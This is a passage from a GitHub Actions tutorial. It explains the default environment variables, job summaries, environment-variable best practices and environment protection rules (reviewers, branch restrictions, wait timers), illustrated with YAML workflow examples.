| `CI`                      | Always set to `true`                                                  |
| `GITHUB_WORKSPACE`        | The path to the workspace directory                                   |
| `GITHUB_ACTION`           | The name of the action currently running                              |
| `GITHUB_ACTIONS`          | Always set to `true` when actions are running                         |
| `GITHUB_ACTOR`            | The username that triggered the workflow                              |
| `GITHUB_API_URL`          | The URL of the GitHub API                                             |
| `GITHUB_BASE_REF`         | The base branch name (pull requests only)                             |
| `GITHUB_ENV`              | Path to file for setting environment variables persisted across steps |
| `GITHUB_EVENT_NAME`       | The name of the webhook event                                         |
| `GITHUB_EVENT_PATH`       | Path to file containing webhook payload                               |
| `GITHUB_GRAPHQL_URL`      | The URL of the GitHub GraphQL API                                     |
| `GITHUB_HEAD_REF`         | The head branch name (pull requests only)                             |
| `GITHUB_JOB`              | The current job ID                                                    |
| `GITHUB_OUTPUT`           | Path to file for setting step outputs                                 |
| `GITHUB_REF`              | The fully-formed ref of the branch/tag                                |
| `GITHUB_REF_NAME`         | The name of the branch/tag without refs/ prefix                       |
| `GITHUB_REF_PROTECTED`    | Whether the ref is protected                                          |
| `GITHUB_REF_TYPE`         | The type of ref (branch or tag)                                       |
| `GITHUB_REPOSITORY`       | The repository in owner/repo format                                   |
| `GITHUB_REPOSITORY_OWNER` | The repository owner's username                                       |
| `GITHUB_RETENTION_DAYS`   | Artifact retention days                                               |
| `GITHUB_RUN_ATTEMPT`      | The attempt number of the workflow run                                |
| `GITHUB_RUN_ID`           | The unique ID of the workflow run                                     |
| `GITHUB_RUN_NUMBER`       | The run number of the workflow                                        |
| `GITHUB_SERVER_URL`       | The URL of the GitHub server                                          |
| `GITHUB_SHA`              | The commit SHA                                                        |
| `GITHUB_STEP_SUMMARY`     | Path to file for job summary                                          |
| `GITHUB_TOKEN`            | Token for authentication                                              |
| `GITHUB_TRIGGERING_ACTOR` | The username that triggered the workflow                              |
| `GITHUB_WORKFLOW`         | The name of the workflow                                              |
| `RUNNER_ARCH`             | The architecture of the runner                                        |
| `RUNNER_DEBUG`            | Enable debug logging when set to true                                 |
| `RUNNER_NAME`             | The name of the runner                                                |
| `RUNNER_OS`               | The operating system (Linux, Windows, or macOS)                       |
| `RUNNER_TEMP`             | Path to temporary directory                                           |
| `RUNNER_TOOL_CACHE`       | Path to tool cache directory                                          |
| `RUNNER_WORKSPACE`        | Path to workspace directory                                           |

#### GITHUB_STEP_SUMMARY — Job Summary Reports

`GITHUB_STEP_SUMMARY` points to a per-job Markdown file. Content you write to it appears in the **Summary** tab of a workflow run, making it easy to surface test results, coverage, and other reports without downloading artifacts.

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Run tests
        id: tests
        run: |
          npm test --reporter json > test-results.json
          echo "PASS_COUNT=$(jq '.numPassedTests' test-results.json)" >> $GITHUB_ENV
          echo "FAIL_COUNT=$(jq '.numFailedTests' test-results.json)" >> $GITHUB_ENV

      - name: Write job summary
        if: always() # run even if tests fail so summary is always produced
        run: |
          echo "## Test Results :test_tube:" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "| Status | Count |" >> $GITHUB_STEP_SUMMARY
          echo "|--------|-------|" >> $GITHUB_STEP_SUMMARY
          echo "| ✅ Passed | $PASS_COUNT |" >> $GITHUB_STEP_SUMMARY
          echo "| ❌ Failed | $FAIL_COUNT |" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          if [ "$FAIL_COUNT" -gt 0 ]; then
            echo "> [!WARNING]" >> $GITHUB_STEP_SUMMARY
            echo "> $FAIL_COUNT test(s) failed. Check the logs above for details." >> $GITHUB_STEP_SUMMARY
          fi
```

**Multi-step summaries** accumulate — each step appends to the same file:

```yaml
steps:
  - name: Build summary
    run: |
      echo "## Build :hammer:" >> $GITHUB_STEP_SUMMARY
      echo "Built from \`${{ github.ref_name }}\` @ \`${{ github.sha }}\`" >> $GITHUB_STEP_SUMMARY

  - name: Deploy summary
    run: |
      echo "## Deployment :rocket:" >> $GITHUB_STEP_SUMMARY
      echo "Deployed to **production** at $(date -u)" >> $GITHUB_STEP_SUMMARY
      echo "[View deployment](${{ vars.PROD_URL }})" >> $GITHUB_STEP_SUMMARY
```

**Key rules:**

- Use `>> $GITHUB_STEP_SUMMARY` (append) not `>` (overwrite)
- Supports standard GitHub-flavored Markdown including tables, task lists, alerts, and collapsible sections
- Summary is per-job — each job has its own summary tab
- The file is automatically collected and shown on the workflow run Summary page

#### RUNNER_TOOL_CACHE — Preinstalled Software

`RUNNER_TOOL_CACHE` points to the directory where GitHub-hosted runner images pre-install language runtimes and tools (the "tool cache"). `setup-*` actions install into or read from this path.

```yaml
- name: List preinstalled tool cache contents
  run: ls $RUNNER_TOOL_CACHE
  # Typical output: Python/ node/ go/ java/...
```

GitHub publishes the preinstalled software lists for each runner image at:
`https://github.com/actions/runner-images` (see the `images/` subdirectory for each OS)

### 10. **Best Practices for Environment Variables**

#### ✓ Do's

```yaml
# ✓ Use meaningful names
env:
  DATABASE_CONNECTION_TIMEOUT: 5000
  MAX_RETRY_ATTEMPTS: 3

# ✓ Use uppercase with underscores
env:
  NODE_ENV: production

# ✓ Store sensitive data in secrets
env:
  API_KEY: ${{ secrets.API_KEY }}

# ✓ Use contexts for dynamic values
env:
  BUILD_TAG: ${{ github.sha }}-${{ github.run_number }}

# ✓ Document complex variables with comments
env:
  # Format: registry/organization/image:tag
  DOCKER_IMAGE: ${{ env.REGISTRY }}/${{ github.repository }}:latest

# ✓ Use step outputs for values that depend on previous steps
- id: version
  run: echo "version=$(npm run get-version)" >> $GITHUB_OUTPUT

- env:
    APP_VERSION: ${{ steps.version.outputs.version }}
  run: echo "Version: $APP_VERSION"
```

#### ✗ Don'ts

```yaml
# ✗ Don't use lowercase or spaces
env:
  nodeEnv: production  # Wrong
  node env: production  # Wrong

# ✗ Don't store secrets in plain environment variables
env:
  PASSWORD: mysecret  # Wrong

# ✗ Don't echo secrets
- run: echo ${{ secrets.TOKEN }}  # Will be redacted but still unsafe

# ✗ Don't use overly long variable names
env:
  VERY_LONG_ENVIRONMENT_VARIABLE_NAME_THAT_NOBODY_CAN_REMEMBER: value

# ✗ Don't rely on shell-specific syntax at workflow level
env:
  # This won't work as expected
  EXPANDED: $HOME/mydir
```

### 11. **Complete Example: Multi-Stage Workflow with Environment Variables**

```yaml
name: Complete Environment Variables Example

on:
  push:
    branches: [main]

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: myapp

jobs:
  prepare:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.version.outputs.value }}
      build-date: ${{ steps.date.outputs.value }}
    env:
      VERSION_FILE: ./version.txt
    steps:
      - uses: actions/checkout@v3

      - id: version
        run: echo "value=$(cat $VERSION_FILE)" >> $GITHUB_OUTPUT

      - id: date
        run: echo "value=$(date +%Y-%m-%d)" >> $GITHUB_OUTPUT

  build:
    needs: prepare
    runs-on: ubuntu-latest
    env:
      APP_VERSION: ${{ needs.prepare.outputs.version }}
      BUILD_DATE: ${{ needs.prepare.outputs.build-date }}
      IMAGE_TAG: ${{ env.REGISTRY }}/${{ github.repository }}:${{ needs.prepare.outputs.version }}
    steps:
      - uses: actions/checkout@v3

      - name: Build Docker image
        env:
          DOCKER_BUILDKIT: 1
        run: |
          echo "Building version: $APP_VERSION"
          echo "Build date: $BUILD_DATE"
          echo "Image tag: $IMAGE_TAG"

  deploy:
    needs: [prepare, build]
    runs-on: ubuntu-latest
    env:
      DEPLOY_ENVIRONMENT: production
      IMAGE_TAG: ${{ env.REGISTRY }}/${{ github.repository }}:${{ needs.prepare.outputs.version }}
    steps:
      - name: Deploy
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
        run: |
          echo "Deploying version: ${{ needs.prepare.outputs.version }}"
          echo "To environment: $DEPLOY_ENVIRONMENT"
          echo "Image: $IMAGE_TAG"
```

---

## Default Environment Variables

GitHub Actions automatically provides a set of default environment variables in every workflow run. These variables contain information about the workflow execution, runner environment, and repository context. Understanding and using these default variables can simplify your workflows and reduce the need for manual configuration.

### Overview of Default Environment Variables

Default environment variables are automatically populated by GitHub and can be accessed without any additional setup. They provide critical information about:

- The workflow execution context (run ID, job name, step number)
- Repository and commit information (SHA, branch, repository name)
- Runner environment details (OS, architecture, temporary directories)
- Workflow trigger details (event name, actor)
- File paths and URLs

### 1. **Workflow and Execution Information**

These variables provide details about the current workflow run.

#### Common Workflow Variables

```yaml
jobs:
  info:
    runs-on: ubuntu-latest
    steps:
      - name: Print Workflow Information
        run: |
          echo "Workflow: $GITHUB_WORKFLOW"
          echo "Run ID: $GITHUB_RUN_ID"
          echo "Run Number: $GITHUB_RUN_NUMBER"
          echo "Run Attempt: $GITHUB_RUN_ATTEMPT"
          echo "Job: $GITHUB_JOB"
          echo "Event Name: $GITHUB_EVENT_NAME"
          echo "Actor: $GITHUB_ACTOR"
          echo "Triggering Actor: $GITHUB_TRIGGERING_ACTOR"
```

#### Output Example

```text
Workflow: CI Pipeline
Run ID: 1234567890
Run Number: 42
Run Attempt: 2
Job: info
Event Name: push
Actor: octocat
Triggering Actor: octocat
```

#### Use Case: Creating Unique Build Identifiers

```yaml
- name: Create Build ID
  run: |
    BUILD_ID="${{ github.workflow }}-${{ github.run_id }}-${{ github.run_attempt }}"
    echo "Build Identifier: $BUILD_ID"
```

### 2. **Repository and Reference Information**

Variables containing details about the repository and Git references.

#### Repository Variables

```yaml
jobs:
  repo-info:
    runs-on: ubuntu-latest
    steps:
      - name: Repository Information
        run: |
          echo "Repository: $GITHUB_REPOSITORY"
          echo "Repository Owner: $GITHUB_REPOSITORY_OWNER"
          echo "Ref: $GITHUB_REF"
          echo "Ref Name: $GITHUB_REF_NAME"
          echo "Ref Type: $GITHUB_REF_TYPE"
          echo "Ref Protected: $GITHUB_REF_PROTECTED"
          echo "Commit SHA: $GITHUB_SHA"
          echo "Server URL: $GITHUB_SERVER_URL"
```

#### Output Example — Context Variables

```text
Repository: octocat/Hello-World
Repository Owner: octocat
Ref: refs/heads/main
Ref Name: main
Ref Type: branch
Ref Protected: true
Commit SHA: abc123def456...
Server URL: https://github.com
```

#### Use Case: Building Docker Images with Semantic Tags

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Build Docker Image
        env:
          REGISTRY: ghcr.io
          IMAGE_NAME: ${{ env.REGISTRY }}/${{ github.repository }}
        run: |
          # Build with both branch name and commit SHA
          docker build -t $IMAGE_NAME:${{ github.ref_name }} .
          docker build -t $IMAGE_NAME:${{ github.sha }} .
          # Also tag as latest if on main
          if [ "${{ github.ref_name }}" = "main" ]; then
            docker build -t $IMAGE_NAME:latest .
          fi
```

### 3. **Branch and Pull Request Information**

When triggered by pull requests, these variables provide additional context.

#### Pull Request Variables

```yaml
on:
  pull_request:
    branches: [main]

jobs:
  pr-check:
    runs-on: ubuntu-latest
    steps:
      - name: PR Information
        run: |
          # Only available on pull_request events
          if [ "${{ github.event_name }}" = "pull_request" ]; then
            echo "Base Ref: ${{ github.base_ref }}"
            echo "Head Ref: ${{ github.head_ref }}"
            echo "Ref: ${{ github.ref }}"
            echo "Event Action: ${{ github.event.action }}"
          fi
```

#### Use Case: Version Control for Feature Branches

```yaml
- name: Generate Branch Version
  run: |
    if [ "${{ github.base_ref }}" = "main" ]; then
      VERSION_SUFFIX="pr-${{ github.event.number }}"
    else
      VERSION_SUFFIX=${{ github.head_ref }}
    fi
    echo "Deploying to: $VERSION_SUFFIX"
```

### 4. **File Path and Workspace Variables**

Variables that provide important file system paths.

#### Path Variables

```yaml
jobs:
  paths:
    runs-on: ubuntu-latest
    steps:
      - name: Show File Paths
        run: |
          echo "Workspace: $GITHUB_WORKSPACE"
          echo "Temp: $RUNNER_TEMP"
          echo "Tool Cache: $RUNNER_TOOL_CACHE"
          echo "Event Path: $GITHUB_EVENT_PATH"
          echo "Env File: $GITHUB_ENV"
          echo "Output File: $GITHUB_OUTPUT"
          echo "Step Summary: $GITHUB_STEP_SUMMARY"
```

#### Output Example (Ubuntu)

```text
Workspace: /home/runner/work/repo/repo
Temp: /home/runner/_temp
Tool Cache: /opt/hostedtoolcache
Event Path: /home/runner/work/_temp/_github_workflow/event.json
Env File: /home/runner/work/_temp/_runner_file_commands/set_env_xxxxx
Output File: /home/runner/work/_temp/_runner_file_commands/set_output_xxxxx
Step Summary: /home/runner/work/_temp/_runner_file_commands/step_summary_xxxxx
```

#### Use Case: Temporary File Storage and Cleanup

```yaml
- name: Build Artifacts
  run: |
    # Use RUNNER_TEMP for temporary files
    mkdir -p $RUNNER_TEMP/build
    npm run build --output=$RUNNER_TEMP/build

- name: Upload from Temp
  uses: actions/upload-artifact@v3
  with:
    name: build-artifacts
    path: ${{ runner.temp }}/build
```

### 5. **Runner Information Variables**

Variables describing the runner executing the job.

#### Runner Variables

```yaml
jobs:
  runner-info:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
    steps:
      - name: Runner Environment
        run: |
          echo "Runner OS: $RUNNER_OS"
          echo "Runner Architecture: $RUNNER_ARCH"
          echo "Runner Name: $RUNNER_NAME"
```

#### Output Examples

**On Ubuntu:**

```text
Runner OS: Linux
Runner Architecture: X64
Runner Name: GitHub Actions 1
```

**On Windows:**

```text
Runner OS: Windows
Runner Architecture: X64
Runner Name: GitHub Actions 2
```

**On macOS:**

```text
Runner OS: macOS
Runner Architecture: X64
Runner Name: GitHub Actions 3
```

#### Use Case: OS-Specific Configuration

```yaml
jobs:
  build:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest]
    steps:
      - name: Build
        run: |
          if [ "$RUNNER_OS" = "Windows" ]; then
            npm run build:windows
          else
            npm run build:unix
          fi
        shell: bash
```

### 6. **GitHub API and Token Variables**

Variables for API access and authentication.

#### API and Token Variables

```yaml
jobs:
  api-access:
    runs-on: ubuntu-latest
    steps:
      - name: Use GitHub API
        run: |
          # GITHUB_TOKEN is automatically provided
          curl -H "Authorization: Bearer ${{ env.GITHUB_TOKEN }}" \
               https://api.github.com/repos/${{ github.repository }}
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

#### URLs Example

```yaml
- name: API URLs
  run: |
    echo "API URL: $GITHUB_API_URL"
    echo "GraphQL URL: $GITHUB_GRAPHQL_URL"
    echo "Server URL: $GITHUB_SERVER_URL"
```

#### Output Example — GitHub API URLs

```text
API URL: https://api.github.com
GraphQL URL: https://api.github.com/graphql
Server URL: https://github.com
```

### 7. **Event Payload Information**

Access to the webhook event that triggered the workflow.

#### Event Payload Access

```yaml
jobs:
  event-info:
    runs-on: ubuntu-latest
    steps:
      - name: Read Event Payload
        run: |
          cat $GITHUB_EVENT_PATH | jq '.'
```

#### Use Case: Extract Commit Message

```yaml
- name: Get Commit Message
  run: |
    if [ "${{ github.event_name }}" = "push" ]; then
      COMMIT_MESSAGE=$(cat $GITHUB_EVENT_PATH | jq -r '.head_commit.message')
      echo "Commit: $COMMIT_MESSAGE"
    fi
```

### 8. **CI Environment Flag**

The CI environment variable indicates the workflow is running in CI.

#### CI Variable Usage

```yaml
jobs:
  example:
    runs-on: ubuntu-latest
    steps:
      - name: Check CI Environment
        run: |
          if [ "$CI" = "true" ]; then
            echo "Running in CI environment"
            npm run build -- --ci
          fi
```

#### Use Case: Conditional Build Configuration

```yaml
- name: Build
  run: npm run build
  env:
    CI: true # Enables CI-specific settings in build tools
    ENVIRONMENT: production
```

### 9. **Debug Mode**

Enable detailed logging with the RUNNER_DEBUG variable.

#### Enabling Debug Logging

```yaml
- name: Enable Debug
  env:
    RUNNER_DEBUG: true
  run: |
    # This will produce verbose output
    npm run build
```

#### Use Case: Troubleshooting

```yaml
jobs:
  debug:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          token: ${{ secrets.GITHUB_TOKEN }}

      - name: Debug Step
        env:
          RUNNER_DEBUG: true
        run: |
          echo "Debug mode enabled"
          # Actions will output more verbose logs
```

### 10. **Complete Reference Table**

| Variable                  | Example Value                    | Description                                |
| ------------------------- | -------------------------------- | ------------------------------------------ |
| `CI`                      | `true`                           | Always true when running in GitHub Actions |
| `GITHUB_WORKSPACE`        | `/home/runner/work/repo/repo`    | Root directory of repository               |
| `GITHUB_ACTION`           | `Build`                          | Name of currently running action           |
| `GITHUB_ACTIONS`          | `true`                           | Always true when running in Actions        |
| `GITHUB_ACTOR`            | `octocat`                        | Username of user that triggered workflow   |
| `GITHUB_API_URL`          | `https://api.github.com`         | URL of GitHub REST API                     |
| `GITHUB_BASE_REF`         | `main`                           | Base branch name (PR only)                 |
| `GITHUB_ENV`              | `/home/runner/work/_temp/...`    | Path to set persistent env vars            |
| `GITHUB_EVENT_NAME`       | `push`                           | Name of webhook event                      |
| `GITHUB_EVENT_PATH`       | `/home/runner/work/_temp/...`    | Path to webhook payload JSON               |
| `GITHUB_GRAPHQL_URL`      | `https://api.github.com/graphql` | URL of GitHub GraphQL API                  |
| `GITHUB_HEAD_REF`         | `feature-branch`                 | Head branch name (PR only)                 |
| `GITHUB_JOB`              | `build`                          | Current job ID                             |
| `GITHUB_OUTPUT`           | `/home/runner/work/_temp/...`    | Path to set step outputs                   |
| `GITHUB_REF`              | `refs/heads/main`                | Fully-formed ref of branch/tag             |
| `GITHUB_REF_NAME`         | `main`                           | Branch or tag name without prefix          |
| `GITHUB_REF_PROTECTED`    | `true`                           | Whether ref is protected                   |
| `GITHUB_REF_TYPE`         | `branch`                         | Type of ref (branch or tag)                |
| `GITHUB_REPOSITORY`       | `octocat/Hello-World`            | Repository in owner/repo format            |
| `GITHUB_REPOSITORY_OWNER` | `octocat`                        | Repository owner username                  |
| `GITHUB_RETENTION_DAYS`   | `90`                             | Artifact retention days                    |
| `GITHUB_RUN_ATTEMPT`      | `2`                              | Current attempt number                     |
| `GITHUB_RUN_ID`           | `1234567890`                     | Unique workflow run ID                     |
| `GITHUB_RUN_NUMBER`       | `42`                             | Sequential workflow run number             |
| `GITHUB_SERVER_URL`       | `https://github.com`             | GitHub server URL                          |
| `GITHUB_SHA`              | `abc123def...`                   | Commit SHA that triggered                  |
| `GITHUB_STEP_SUMMARY`     | `/home/runner/work/_temp/...`    | Path to job summary                        |
| `GITHUB_TOKEN`            | (token)                          | Token for GitHub API auth                  |
| `GITHUB_TRIGGERING_ACTOR` | `octocat`                        | User that triggered workflow               |
| `GITHUB_WORKFLOW`         | `CI`                             | Workflow name                              |
| `RUNNER_ARCH`             | `X64`                            | Runner architecture                        |
| `RUNNER_DEBUG`            | `false`                          | Enable debug logging                       |
| `RUNNER_NAME`             | `GitHub Actions 1`               | Runner display name                        |
| `RUNNER_OS`               | `Linux`                          | Operating system                           |
| `RUNNER_TEMP`             | `/home/runner/_temp`             | Temporary directory path                   |
| `RUNNER_TOOL_CACHE`       | `/opt/hostedtoolcache`           | Tool cache directory                       |
| `RUNNER_WORKSPACE`        | `/home/runner/work`              | Workspace directory                        |

### 11. **Complete Practical Example**

Here's a comprehensive example using multiple default environment variables:

```yaml
name: Build and Deploy with Environment Vars

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  build-and-test:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest]
    steps:
      - uses: actions/checkout@v3

      - name: Display Environment Info
        run: |
          echo "=== Workflow Information ==="
          echo "Workflow: $GITHUB_WORKFLOW"
          echo "Run: $GITHUB_RUN_NUMBER (Attempt: $GITHUB_RUN_ATTEMPT)"
          echo ""
          echo "=== Repository Information ==="
          echo "Repository: $GITHUB_REPOSITORY"
          echo "Branch: $GITHUB_REF_NAME"
          echo "Commit: $GITHUB_SHA"
          echo ""
          echo "=== Event Information ==="
          echo "Event: $GITHUB_EVENT_NAME"
          echo "Actor: $GITHUB_ACTOR"
          echo ""
          echo "=== Runner Information ==="
          echo "OS: $RUNNER_OS"
          echo "Architecture: $RUNNER_ARCH"

      - name: Setup Build Environment
        run: |
          mkdir -p $RUNNER_TEMP/artifacts
          echo "Build directory: $RUNNER_TEMP/artifacts"

      - name: Build
        run: |
          npm run build
          cp -r dist $RUNNER_TEMP/artifacts/

      - name: Test
        env:
          CI: true
        run: npm test

      - name: Create Build Summary
        run: |
          cat > $GITHUB_STEP_SUMMARY << EOF
          ## Build Summary
          - **Workflow:** $GITHUB_WORKFLOW
          - **Branch:** $GITHUB_REF_NAME
          - **Commit:** $GITHUB_SHA
          - **OS:** $RUNNER_OS
          - **Status:** ✅ Success
          EOF

      - name: Upload Artifacts
        if: success()
        uses: actions/upload-artifact@v3
        with:
          name: build-${{ runner.os }}-${{ github.run_number }}
          path: ${{ runner.temp }}/artifacts

  deploy:
    if: github.event_name == 'push' && github.ref_name == 'main'
    needs: build-and-test
    runs-on: ubuntu-latest
    steps:
      - name: Deploy Information
        run: |
          echo "Deploying from: $GITHUB_REPOSITORY"
          echo "Triggered by: $GITHUB_ACTOR"
          echo "Commit: $GITHUB_SHA"
          echo "Build ID: $GITHUB_RUN_ID"

      - name: Call Deployment API
        run: |
          curl -X POST https://api.example.com/deploy \
            -H "Authorization: Bearer ${{ secrets.DEPLOY_TOKEN }}" \
            -d "{
              \"repository\": \"$GITHUB_REPOSITORY\",
              \"commit\": \"$GITHUB_SHA\",
              \"branch\": \"$GITHUB_REF_NAME\",
              \"run_id\": \"$GITHUB_RUN_ID\"
            }"
```

---

## Environment Protection Rules

Environment protection rules are powerful GitHub security features that allow you to control how and when workflows can access and deploy to specific environments. They help ensure that sensitive deployments require proper authorization, reviews, and validation before proceeding.

### Overview of Environment Protection Rules

Environment protection rules provide several key benefits:

- **Controlled Access**: Restrict who can deploy to production or other protected environments
- **Review Requirements**: Mandate that deployments require approval before execution
- **Branch Protection**: Specify which branches are allowed to deploy to an environment
- **Deployment Timing**: Control when deployments can occur
- **Audit Trail**: Track all deployment approvals and denials

### 1. **Required Reviewers**

Require one or more team members to approve deployments before they proceed.

#### Configuration in Repository Settings

Navigate to: `Settings > Environments > [Environment Name] > Deployment branches and reviewers`

Enable "Required reviewers" and select the GitHub users or teams who must approve deployments.

#### Workflow Implementation

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production # References the protected environment
    steps:
      - uses: actions/checkout@v3
      - name: Deploy to Production
        run: |
          echo "Deployment approved and proceeding..."
          bash deploy.sh
```

#### How It Works

1. Workflow reaches a step with `environment: production`
2. GitHub pauses the workflow and waits for approval
3. Designated reviewers receive a notification to review the deployment
4. Once approved (or rejected), the workflow continues or fails
5. Approval is recorded in the deployment history

#### Example: Multi-Reviewer Approval Process

```yaml
name: Production Deployment

on:
  push:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: npm test

  deploy-staging:
    needs: build
    runs-on: ubuntu-latest
    environment:
      name: staging
      url: https://staging.example.com
    steps:
      - uses: actions/checkout@v3
      - run: bash deploy-staging.sh

  deploy-production:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://example.com
    steps:
      - uses: actions/checkout@v3
      - name: Require manual approval (via environment settings)
        run: |
          echo "Waiting for production approval..."
          echo "Current deployments require review from senior engineers"
      - run: bash deploy-production.sh
      - name: Notify deployment
        run: |
          echo "Deployment to production completed"
          echo "Commit: ${{ github.sha }}"
          echo "Deployed by: ${{ github.actor }}"
```

### 2. **Deployment Branches**

Restrict which branches can deploy to a specific environment.

#### Configuration Options

##### Protected Branches Only

```text
Only allow deployments from protected branches
```

##### Specific Branches

```text
main
release/*
prodaction/*
```

**All Branches** (least restrictive)

#### Example Workflow

```yaml
name: Conditional Deployment

on:
  push:
    branches: [main, develop, "release/*"]

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://example.com
    # If environment is configured to allow only 'main' branch,
    # this job will fail on other branches
    steps:
      - uses: actions/checkout@v3
      - name: Verify Branch
        run: |
          if [ "${{ github.ref_name }}" = "main" ]; then
            echo "✓ Production deployment approved (main branch)"
          else
            echo "✗ Production deployment only allowed from main"
            exit 1
          fi
      - run: bash deploy.sh
```

#### Use Case: Different Strategies for Different Branches

```yaml
jobs:
  deploy-staging:
    if: github.ref_name == 'develop'
    environment:
      name: staging
    runs-on: ubuntu-latest
    steps:
      - run: bash deploy-staging.sh

  deploy-production:
    if: github.ref_name == 'main'
    environment:
      name: production # Only allows main branch
    runs-on: ubuntu-latest
    steps:
      - run: bash deploy-production.sh
```

### 3. **Wait Timer**

Add a delay before deployment is allowed to proceed, providing time for validation or issue discovery.

#### Configuration

Set wait timer (in minutes): `0` to `43200` (30 days)

#### Example: 24-Hour Wait Timer for Production

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: production
      # When environment has 24-hour wait timer:
      # - Workflow triggers and waits 24 hours before proceeding
    steps:
      - uses: actions/checkout@v3
      - name: Pre-deployment checklist
        run: |
          echo "Deployment initiated at: $(date)"
          echo "Will proceed in 24 hours..."
          echo "Waiting for:"
          echo "- QA verification"
          echo "- Security review"
          echo "- Stakeholder confirmation"
      - run: bash deploy.sh
```

#### Use Case: Staggered Deployment Strategy

```yaml
jobs:
  deploy-canary:
    runs-on: ubuntu-latest
    environment:
      name: canary
      # No wait timer - immediate deployment to 5% of users
    steps:
      - run: bash deploy-canary.sh

  deploy-production:
    needs: deploy-canary
    runs-on: ubuntu-latest
    environment:
      name: production
      # 1-hour wait timer for full production rollout
      # Allows time to monitor canary deployment
    steps:
      - run: bash deploy-production.sh
```

### 4. **Custom Deployment Protection Rules**

Use GitHub Scripts (available on GitHub Enterprise) to create custom logic for deployment approval.

#### Example: Automated Approval Based on Test Results

```yaml
name: Smart Deployment

on:
  push:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    outputs:
      test-status: ${{ steps.test.outputs.status }}
    steps:
      - uses: actions/checkout@v3
      - id: test
        run: |
          npm test
          echo "status=passed" >> $GITHUB_OUTPUT

  deploy:
    needs: test
    runs-on: ubuntu-latest
    environment:
      name: staging
    steps:
      - uses: actions/checkout@v3
      - name: Check Test Status
        if: needs.test.outputs.test-status == 'passed'
        run: |
          echo "✓ Tests passed - proceeding with deployment"
          bash deploy.sh
      - name: Deployment Blocked
        if: needs.test.outputs.test-status != 'passed'
        run: |
          echo "✗ Tests failed - deployment blocked"
          exit 1
```

### 5. **Complete Example: Multi-Environment Protection Strategy**

```yaml
name: Multi-Environment Deployment with Protection Rules

on:
  push:
    branches: [develop, main, "release/*"]

jobs:
  build-and-test:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.version.outputs.value }}
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
        with:
          node-version: 18
      - run: npm ci
      - run: npm run lint
      - run: npm test
      - id: version
        run: echo "value=$(npm run get-version)" >> $GITHUB_OUTPUT

  deploy-dev:
    needs: build-and-test
    runs-on: ubuntu-latest
    if: github.ref_name == 'develop'
    environment:
      name: development
      url: https://dev.example.com
      # No protection rules - immediate deployment
    steps:
      - uses: actions/checkout@v3
      - run: |
          echo "Deploying version ${{ needs.build-and-test.outputs.version }} to dev"
          bash deploy-dev.sh

  deploy-staging:
    needs: build-and-test
    runs-on: ubuntu-latest
    if: github.ref_name == 'main' || startsWith(github.ref, 'refs/heads/release/')
    environment:
      name: staging
      url: https://staging.example.com
      # Protection rule: requires 1 reviewer approval
      # For QA verification before full deployment
    steps:
      - uses: actions/checkout@v3
      - run: |
          echo "Deploying version ${{ needs.build-and-test.outputs.version }} to staging"
          bash deploy-staging.sh

  deploy-production:
    needs: [build-and-test, deploy-staging]
    runs-on: ubuntu-latest
    if: github.ref_name == 'main'
    environment:
      name: production
      url: https://example.com
      # Protection rules:
      # - Requires 2 reviewer approvals from senior engineers
      # - Only main branch allowed
      # - 30-minute wait timer for final checks
    steps:
      - uses: actions/checkout@v3
      - name: Pre-production Checklist
        run: |
          echo "=== Pre-Production Deployment Checklist ==="
          echo "✓ Build completed: ${{ needs.build-and-test.outputs.version }}"
          echo "✓ Staging deployment successful"
          echo "✓ Approved by authorized reviewers"
          echo "✓ 30-minute wait timer passed"
      - run: |
          echo "Deploying version ${{ needs.build-and-test.outputs.version }} to production"
          bash deploy-production.sh
      - name: Post-Deployment Notification
        if: success()
        run: |
          echo "✓ Production deployment successful"
          echo "Version: ${{ needs.build-and-test.outputs.version }}"
          echo "Deployed by: ${{ github.actor }}"
          echo "Time: $(date)"

  rollback:
    runs-on: ubuntu-latest
    if: failure() && github.ref_name == 'main'
    environment: production
    steps:
      - name: Notify Deployment Failure
        run: |
          echo "⚠ Production deployment failed"
          echo "Rollback may be required"
          echo "Alert sent to on-call engineers"
```

### 6. **Best Practices for Environment Protection Rules**

#### ✓ Recommended Practices

```yaml
# ✓ Use different protection levels per environment
environments:
  development: {}  # No restrictions
  staging:
    reviewers: [qa-team]  # QA approval required
  production:
    reviewers: [senior-engineers, devops-team]  # Multiple approvals
    branch-restrictions: [main]  # Only main branch
    wait-timer: 30  # 30 minutes for final validation

# ✓ Clear environment names and URLs
environment:
  name: production
  url: https://example.com  # Helps reviewers understand what's being deployed

# ✓ Include context in workflow
- name: Deployment Information
  run: |
    echo "Environment: ${{ github.environment }}"
    echo "Branch: ${{ github.ref_name }}"
    echo "Commit: ${{ github.sha }}"
    echo "Triggered by: ${{ github.actor }}"
```

#### ✗ Anti-Patterns to Avoid

```yaml
# ✗ No protection rules for production
environment: production  # Dangerous - anyone can deploy

# ✗ Allowing all branches to all environments
environment:
  name: production
  # No branch restrictions - feature branches can deploy to production

# ✗ Disabling reviews for production
environment:
  name: production
  # No reviewers required - critical issue

